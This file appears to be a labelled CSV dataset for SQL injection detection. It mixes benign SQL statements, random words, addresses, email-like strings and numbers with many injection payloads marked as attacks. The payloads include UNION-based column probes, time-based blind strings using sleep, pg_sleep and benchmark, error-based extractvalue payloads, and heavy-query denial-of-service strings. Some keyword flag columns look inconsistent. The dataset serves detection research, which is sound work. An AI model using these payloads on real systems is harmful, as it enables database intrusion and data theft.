Query,SELECT,UNION,OR,AND,Label
SELECT * FROM Customers  WHERE CustomerName NOT LIKE 'a%';,1,0,0,0,0
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,1,1,0,1
SELECT grabbed ( s )  FROM moon,1,0,0,0,0
"-7142'   )    )    union all select 5083,5083,5083,5083#",1,1,0,0,1
SELECT COUNT ( explain ) FROM few,1,0,0,0,0
"plza. carmelo solis, 78, 4?g",0,0,0,0,0
empeine,0,0,0,0,0
"1'+  (  select vxax where 9036  =  9036 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1,0,0,1,1
"1"" and   (  3020  =  3020  )  *6703",0,0,0,1,1
 ( ,0,0,0,0,1
1'+  (  select iwbs where 4939  =  4939,1,0,0,0,1
minter@ac-activos.sk,0,0,0,0,0
1   )    )     )   and 9575  =  1640--,0,0,0,1,1
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,0,0,0,1
"1%'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,1,0,1
SELECT * FROM require FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cneo"" like ""cneo",1,0,0,1,1
SELECT * FROM think WHERE shown BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
DELETE FROM weight,0,0,0,0,0
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1,1,0,0,1
"  UPDATE worry SET seven =  'man', City =  'easily' WHERE hope =  action",0,0,1,0,0
1'+  (  select 'wsjk' where 3291  =  3291,1,0,0,0,1
"1   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,0,1
SELECT * FROM paid WHERE whispered NOT LIKE 'everything%',1,0,0,0,0
DELETE FROM desk,0,0,0,0,0
"SELECT DAYOFMONTH ( ""2017-06-15 09:34:21"" ) ;",1,0,0,0,0
montn,0,0,0,0,0
"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,0,1,0,1
SELECT * FROM  ( SELECT together FROM here ) ,1,0,0,0,0
SELECT * FROM sky WHERE such NOT LIKE 'pitch%',1,0,0,0,0
SELECT AVG ( Price ) FROM answer,1,0,0,0,0
SELECT AVG ( found ) FROM ready,1,0,0,0,0
4176,0,0,0,0,0
"calle andres mellado, 83, 12-d",0,0,0,1,0
"1',iif  (  4861  =  6268,1,1/0  )  ",0,0,0,0,1
"   SELECT COUNT ( here ) , silver FROM double BY toy",1,0,0,0,0
"INSERT INTO balance  ( meant, gravity, daily )  VALUES  ( 'let', 'soldier', 'chief' )  ",0,0,0,0,0
SELECT TOP 3 * FROM heading WHERE character = 'prepare' SELECT * FROM warm,1,0,0,0,0
37711,0,0,0,0,0
malleson_varney@tomorrow.com.cz,0,0,1,0,0
SELECT COUNT ( DISTINCT pupil )  FROM movement,1,0,0,0,0
SELECT * FROM native WHERE couple = 'hard',1,0,0,0,0
" SELECT * FROM wherever ORDER BY consonant ASC, within DESC",1,0,1,0,0
2144,0,0,0,0,0
SELECT AVG ( either ) FROM usual SELECT SUM ( effect ) ,1,0,0,0,0
"-2167'   )    )     )   union all select 3804,3804,3804,3804,3804,3804#",1,1,0,0,1
enratonarse,0,0,0,0,0
SELECT AVG ( forest ) FROM drop SELECT SUM ( eat ) ,1,0,1,0,0
truswell@soybueno.be,0,0,0,0,0
erny1,0,0,0,0,0
rec,0,0,0,0,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",1,0,0,1,1
1  )   as cinw where 3732  =  3732 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,0,1,1
34347,0,0,0,0,0
"   SELECT cause,may,yesterday,cookies,fill     (  (  upper JOIN common ON tide.facing =  brain.object )   INNER JOIN blowON Orders.notice =  inch.sangID ) ",1,0,1,0,0
2354,0,0,0,0,0
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'uqyt'  =  'uqyt",1,0,1,1,1
SELECT AVG ( disappear )  FROM nearly  SELECT SUM ( porch ) ,1,0,1,0,0
"1' in boolean mode  )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,0,1,0,1
SELECT * FROM board  WHERE eleven = expression,1,0,0,0,0
SELECT Count ( * )  AS paragraph,1,0,0,0,0
blasinda,0,0,0,0,0
columbino,0,0,0,0,0
SELECT * FROM walk WHERE sudden LIKE '%serious%',1,0,0,0,0
-2233' or   (  1807  =  7274  )  *7274,0,0,1,0,1
SELECT TOP 3 * FROM suppose SELECT * FROM stairs 3SELECT * FROM sharp,1,0,0,0,0
"SELECT * FROM useful WHERE took BETWEEN ""egg"" AND    ""likely""",1,0,0,1,0
orzuelo,0,0,1,0,0
1 rlike sleep  (  5  )  # urxh,0,0,0,0,1
marling,0,0,0,0,0
" select * from users where id  =  1 union select @ _,version  (    )   -- 1",1,1,0,0,1
"-5082   )    )    union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#",1,1,0,0,1
57,0,0,0,0,0
SELECT * FROM [Brazil   Customers];,1,0,0,0,0
"1"" where 5333  =  5333 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
"-1647'   )    )    union all select 3030,3030,3030,3030,3030,3030,3030--",1,1,0,0,1
0om7rera,0,0,0,0,0
SELECT weigh ( s )  FROM pole FULL OUTER JOIN,1,0,0,0,0
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,0,1,0,1
9ar5i04o,0,0,0,0,0
SELECT COUNT ( lot ) FROM people,1,0,0,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  '%'  =  '",1,0,0,1,1
SELECT shells ( s )  FROM people SELECT he ( s ) ,1,0,0,0,0
SELECT Count ( * )  AS ourselves,1,0,0,0,0
"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",1,1,0,0,1
SELECT * FROM forgotten WHERE would = 'month',1,0,1,0,0
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""xsfg"" like ""xsfg",1,0,0,1,1
"1""   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",0,0,1,0,1
taciano,0,0,0,0,0
SELECT unit FROM meet UNION SELECT notice FROM including ORDER BY specific,1,1,1,0,0
"1' in boolean mode  )   union all select null,null,null--",1,1,0,0,1
"-4802 union all select 7381,7381,7381,7381,7381,7381,7381,7381,7381,7381--",1,1,0,0,1
s16nio5o,0,0,0,0,0
1'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,0,0,1,1
SELECT * FROM pen WHERE complex = 'satisfied'  AND City = 'soldier',1,0,0,1,0
berghof@esbien.bt,0,0,0,0,0
SELECT * FROM indicate WHERE establish = 'so'  OR gave = 'cheese',1,0,1,0,0
"1%' and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and '%'  =  '",1,0,0,1,1
san juan bosco 113 1-d,0,0,0,0,0
SELECT COUNT ( DISTINCT beautiful )  FROM lying,1,0,0,0,0
SELECT AVG ( stopped ) FROM lay,1,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_link' LIMIT 1,1,0,0,0,0
SELECT sight FROM nine UNION ALL SELECT knew FROM lie ORDER BY aside,1,1,1,0,0
fullum6,0,0,0,0,0
c/ moriles 91,0,0,1,0,0
-5769  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1,0,1,0,1
akca@muevetuweb.pa,0,0,0,0,0
SELECT * FROM property WHERE save = 'condition',1,0,0,0,0
"1%"" union all select null,null,null,null,null,null#",1,1,0,0,1
" select * from users where id  =  1 or "",  )  ""  =  1 or 1  =  1 -- 1",1,0,1,0,1
SELECT AVG ( phrase ) FROM ahead SELECT SUM ( related ) ,1,0,0,0,0
SELECT * FROM should WHERE rear = 'divide',1,0,0,0,0
4089,0,0,0,0,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1,0,0,1,1
" SELECT column_name ( s )  FROM within,sad",1,0,0,0,0
SELECT writer ( s FROM black RIGHT JOIN,1,0,0,0,0
p563l5os1,0,0,0,0,0
1'   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   'rgyc'  =  'rgyc,1,0,0,1,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  lrov  ) ,1,0,0,0,1
SELECT TOP 50 PERCENT * FROM read SELECT * FROM kept FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM beyond,1,0,0,0,0
SELECT can FROM rough UNION SELECT speech FROM boy ORDER BY cookies,1,1,1,0,0
SELECT heading,1,0,0,0,0
82452687x,0,0,0,0,0
"  SELECT * FROM daily WHERE spin IN  ( 'spring', 'load', 'hold' )  ",1,0,0,0,0
sheila,0,0,0,0,0
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
-9024  )   where 1686  =  1686 or 3069  =  8213--,0,0,1,0,1
"1""  )   where 6138  =  6138 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1,0,0,1,1
6.03007E+15,0,0,0,0,0
"1' where 6963  =  6963 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
he53e9ona,0,0,0,0,0
"   SELECT COUNT ( triangle ) , again FROM fruit BY large",1,0,0,0,0
 and 1  =  0  )   union all,0,1,0,1,1
avril,0,0,0,0,0
follosas,0,0,0,0,0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  1073  =  1073,1,0,0,1,1
de las muecas pedrol,0,0,0,0,0
micr6pil8,0,0,0,0,0
1' in boolean mode  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
"  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him",0,0,1,0,0
SELECT * FROM silver  WHERE date NOT LIKE '[probably]%',1,0,0,0,0
"calle san isidro labrador 188, 13?h",0,0,1,0,0
lanfranchi@getgold.tl,0,0,0,0,0
4.14869E+15,0,0,0,0,0
SELECT TOP 50 PERCENT * FROM across SELECT * FROM agree FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM per,1,0,0,0,0
"-2441' union all select 1853,1853,1853,1853,1853,1853,1853--",1,1,0,0,1
SELECT hat FROM felt UNION ALL SELECT rich FROM last ORDER BY create,1,1,1,0,0
villanueva de duero,0,0,0,0,0
SELECT worry ( s FROM balloon RIGHT JOIN,1,0,1,0,0
"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",1,1,0,0,1
SELECT * FROM rod WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
 (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,1,0,0,0,1
barrera medio,0,0,0,0,0
SELECT * FROM hung WHERE that = 'immediately'  OR find = 'search',1,0,1,0,0
-3186 or 3867  =  9405,0,0,1,0,1
"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",0,0,1,0,1
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,0,1,0,1
1'   )    )    as fqia where 1936  =  1936 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,0,0,1,1
SELECT * FROM box WHERE start = 'clock',1,0,0,0,0
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,0,1,1,1
SELECT citizen ( s )  FROM news SELECT distant FROM hall,1,0,0,0,0
"-9119""  )   where 9237  =  9237 or 8571  =  8571--",0,0,1,0,1
SELECT * FROM willing,1,0,0,0,0
SELECT AVG ( ready ) FROM pure SELECT SUM ( chapter ) ,1,0,0,0,0
18l4et2ro,0,0,0,0,0
buenda,0,0,0,0,0
SELECT TOP 50 PERCENT * FROM decide SELECT * FROM unhappy FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM about,1,0,0,0,0
 UPDATE grew SET tax = 'bus'WHERE throughout = 'pictured',0,0,0,0,0
"1  )   as ghew where 6441  =  6441 union all select null,null--",1,1,0,0,1
SELECT AVG ( mysterious ) FROM bush SELECT SUM ( adult ) ,1,0,0,0,0
SELECT * FROM minute WHERE story = 'student'  AND City = 'bill',1,0,1,1,0
SELECT * FROM snow 3,1,0,0,0,0
4909,0,0,0,0,0
clarucha,0,0,0,0,0
1.69372E+15,0,0,0,0,0
"1 where 9898  =  9898 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,0,1,1
"1""  )   as giqb where 4664  =  4664",0,0,0,0,1
"   SELECT cattle, post, sidesFROM breathing WHERE tropical  IS NOT NULL",1,0,0,0,0
SELECT MIN ( piano )  AS voyage FROM experiment,1,0,0,0,0
"c/ pintor viver s/n, 1?b",0,0,1,0,0
grgar8,0,0,0,0,0
-9581  )   as jkqo where 5200  =  5200 or 6872  =  6872--,0,0,1,0,1
"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,1,0,0,1
SELECT AVG ( well ) FROM drop SELECT SUM ( statement ) ,1,0,0,0,0
SELECT * FROM nearby WHERE    NOT toward = 'letter',1,0,0,0,0
"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""lsis"" like ""lsis",1,0,1,1,1
select case when 7649  =  9297 then 1 else null end--,1,0,0,0,1
40542,0,0,0,0,0
SELECT AVG ( both )  FROM bring  SELECT SUM ( herd ) ,1,0,0,0,0
SELECT TOP 50 PERCENT * FROM locate SELECT * FROM death FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM greater,1,0,0,0,0
"1""  )   where 8588  =  8588",0,0,0,0,1
9nte0uer3o,0,0,0,0,0
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",1,0,1,1,1
SELECT DISTINCT free FROM them,1,0,0,0,0
1'+  (  select 'ozpm' where 6939  =  6939 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1,0,0,0,1
SELECT AVG ( shown ) FROM attack SELECT SUM ( change ) ,1,0,0,0,0
"-4764  )   where 8200  =  8200 union all select 8200,8200,8200,8200--",1,1,0,0,1
"-7950 where 9619  =  9619 union all select 9619,9619,9619,9619--",1,1,0,0,1
1   )    )    as iihk where 5414  =  5414 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1,0,0,1,1
"-2247'  )   union all select 1202,1202,1202,1202,1202#",1,1,0,0,1
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,0,0,0,1
1'  )   as dqgr where 2427  =  2427 and   (  3020  =  3020  )  *6703--,0,0,0,1,1
69320452q,0,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_sm::is_connected_to_gs' LIMIT 1,1,0,0,0,0
SELECT * FROM accurate WHERE library BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
c/ dos de mayo 89 13?b,0,0,0,0,0
mohedano tinoco,0,0,0,0,0
5756,0,0,0,0,0
SELECT very ( s FROM slightly RIGHT JOIN,1,0,0,0,0
DELETE FROM door WHERE grow = 'small',0,0,1,0,0
SELECT major ( s )  FROM fat FULL OUTER JOIN,1,0,1,0,0
SELECT * FROM simple 3 SELECT * FROM outer,1,0,0,0,0
"   SELECT careful, aware, reasonFROM plane WHERE flag  IS NOT NULL",1,0,0,0,0
SELECT COUNT ( grabbed )  FROM highway,1,0,0,0,0
SELECT * FROM anywhere WHERE one NOT LIKE '[attack]%',1,0,0,0,0
"-3749"" or elt  (  1032  =  1032,3623  )   and ""mzrw""  =  ""mzrw",0,0,1,1,1
"  SELECT kill AS football, supply AS [drove]  FROM saved",1,0,0,0,0
"iif  (  1718  =  5436,1,1/0  )  ",0,0,0,0,1
"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,0,0,1,1
"1""  )   where 5938  =  5938 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,0,0,1,1
"-7146"" where 6431  =  6431 or 8548  =  5549--",0,0,1,0,1
mahecha barguo,0,0,0,0,0
SELECT DISTINCT day FROM one,1,0,0,0,0
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",0,0,1,1,1
"1%'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  '%'  =  '",1,0,0,1,1
8.54124E+15,0,0,0,0,0
SELECT * FROM salt WHERE sale LIKE '%scientist%',1,0,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""psbz""  =  ""psbz",1,0,0,1,1
j804n86o,0,0,0,0,0
"1"" and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and ""nzgn""  =  ""nzgn",1,1,1,1,1
"1'   )    )    as nuku where 7009  =  7009 union all select null,null,null,null,null#",1,1,0,0,1
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1,0,1,0,1
"-3699%'   )    )     )   union all select 8241,8241,8241,8241,8241,8241,8241,8241,8241#",1,1,0,0,1
6015,0,0,0,0,0
"-5130'   )    )    union all select 5218,5218,5218,5218,5218,5218,5218,5218,5218,5218--",1,1,0,0,1
1  )   where 1929  =  1929 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --,1,0,0,1,1
SELECT * FROM recently WHERE coat = 'excellent' LIMIT 3,1,0,0,0,0
"-4929"" where 6381  =  6381 or 8571  =  8571--",0,0,1,0,1
beaule,0,0,0,0,0
 UPDATE paper SET damage = 'stood'WHERE behavior = 'drawn',0,0,1,0,0
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1,0,0,0,1
"-8506'   )    )     )   union all select 1950,1950,1950,1950,1950,1950--",1,1,0,0,1
1'   )    )    as pdcl where 6964  =  6964,0,0,0,0,1
82380804w,0,0,0,0,0
manzanares bruguer,0,0,0,0,0
-6661'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'tbmu' like 'tbmu,1,0,1,1,1
SELECT * FROM rhythm ORDER BY favorite,1,0,1,0,0
SELECT * FROM hung WHERE easily NOT LIKE '[bill]%',1,0,0,0,0
SELECT * FROM example WHERE castle NOT BETWEEN 'silly' AND 'addition',1,0,0,1,0
SELECT * FROM flat WHERE drop BETWEEN pale09/01/1996weigh AND began15/31/1996known,1,0,0,1,0
SELECT * FROM flame WHERE book  BETWEEN 10 AND 20,1,0,0,1,0
silvie,0,0,0,0,0
"-6067'+  (  select 'bfhf' where 3114  =  3114 union all select 3114,3114,3114,3114,3114,3114,3114,3114--",1,1,0,0,1
SELECT AVG ( once ) FROM giant SELECT SUM ( slightly ) ,1,0,0,0,0
1'+  (  select 'qxmo' where 9511  =  9511 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,0,0,0,1
"1"" where 7599  =  7599",0,0,0,0,1
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse,1,0,1,0,0
dinaband,0,0,0,1,0
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1,0,0,1,1
hoog,0,0,0,0,0
"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",1,1,0,0,1
"1""  )   as ufai where 9673  =  9673",0,0,0,0,1
serret@sierradealcaraz.dj,0,0,0,0,0
-3988'   )    )    union all select 1113#,1,1,0,0,1
SELECT expect ( s )  FROM doing FULL OUTER JOIN,1,0,0,0,0
1 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  -- jdia,1,0,0,1,1
"SELECT STRCMP ( ""SQL Tutorial"",   ""SQL Tutorial"" ) ;",1,0,1,0,0
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",1,0,1,0,1
SELECT MIN ( importance )  AS health FROM log,1,0,1,0,0
"   SELECT warn, reach+ ', ' + firm+ ' ' + powerful+ ', ' + friendly AS ago  FROM attack",1,0,0,0,0
"1'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,0,1,1
baladora,0,0,1,0,0
"SELECT customername, contactname FROM customers; ALTER TABLE Customers ADD Email varchar ( 255 ) ; ALTER TABLE Customers DROP COLUMN Email; DROP TABLE Shippers;  TRUNCATE TABLE Categories;",1,0,1,0,0
SELECT * FROM mass WHERE NOT little = 'harder'  AND NOT share = 'automobile',1,0,0,1,0
"-3219""  )   order by 1--",0,0,1,0,1
"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1,0,1,0,1
14100,0,0,0,0,0
lucio,0,0,0,0,0
zarlenga,0,0,0,0,0
"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",0,0,1,1,1
"   SELECT brave,package,these,raw,result     (  (  large JOIN also ON way.collect =  wall.difficult )   INNER JOIN proudON Orders.farm =  pipe.certainlyID ) ",1,0,1,0,0
SELECT * FROM broke WHERE consider NOT LIKE 'electricity%',1,0,0,0,0
SELECT * FROM all WHERE level = 'might' LIMIT 3,1,0,0,0,0
SELECT * FROM fuel FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM told,1,0,0,0,0
SELECT airplane,1,0,0,0,0
79274775p,0,0,0,0,0
SELECT * FROM word WHERE is BETWEEN education09/01/1996elephant AND twelve15/31/1996cut,1,0,1,1,0
"1   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",0,0,1,1,1
zohreh,0,0,0,0,0
" select * from users where id  =  1. union select null,version  (    )   -- 1",1,1,0,0,1
"  SELECT fall,empty FROM language WHERE darkness = 'distant' UNION SELECT way, never FROM made",1,1,0,0,0
walborn@19horas.cat,0,0,1,0,0
1526,0,0,0,0,0
SELECT COUNT ( DISTINCT purple )  FROM even,1,0,0,0,0
1   )    ) ,0,0,0,0,1
SELECT * FROM represent WHERE his BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
SELECT AVG ( population ) FROM thread SELECT SUM ( at ) ,1,0,0,0,0
select   (  case when   (  4061  =  1396  )   then 4061 else 1/  (  select 0  )   end  )  --,1,0,0,0,1
tahull garola,0,0,0,0,0
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,0,1,0,1
kouhi,0,0,0,0,0
"1"" where 4633  =  4633 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,0,1,1
SELECT * FROM either WHERE they = 'cat'  AND City = 'ahead',1,0,0,1,0
SELECT * FROM comfortable WHERE driven NOT LIKE '[read]%',1,0,1,0,0
martens@ajuntamentbarcelona2-0.tl,0,0,0,0,0
mallo etchart,0,0,0,0,0
"-2340%"" order by 1#",0,0,1,0,1
ilya,0,0,0,0,0
SELECT AVG ( thought ) FROM forget SELECT SUM ( cutting ) ,1,0,1,0,0
" select * from users where id  =  1 or ""1,"" or 1  =  1 -- 1",1,0,1,0,1
SELECT * FROM minerals WHERE tried = 'dangerous' FETCH FIRST 3 ROWS ONLY,1,0,0,0,0
"1""  )   as assu where 7521  =  7521 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,0,1,0,1
SELECT * FROM complex WHERE blue NOT LIKE 'outline%',1,0,0,0,0
qui0g6n16si2o,0,0,0,0,0
SELECT COUNT ( primitive ) FROM especially,1,0,0,0,0
-2055  )   or 3038  =  3038,0,0,1,0,1
"SELECT ProductName, UnitPrice *  ( UnitsInStock + UnitsOnOrder )  FROM Products;",1,0,1,0,0
SELECT * FROM sugar WHERE south BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
"-8608"" or 5460  =  4461--",0,0,1,0,1
broquel,0,0,0,0,0
66,0,0,0,0,0
" SELECT column_name ( s )  FROM location,arrangement",1,0,0,0,0
SELECT COUNT ( divideID ) FROM asleep,1,0,0,0,0
" SELECT * FROM sets ORDER BY score, fierce",1,0,1,0,0
SELECT city ( s )  FROM involved FULL OUTER JOIN,1,0,0,0,0
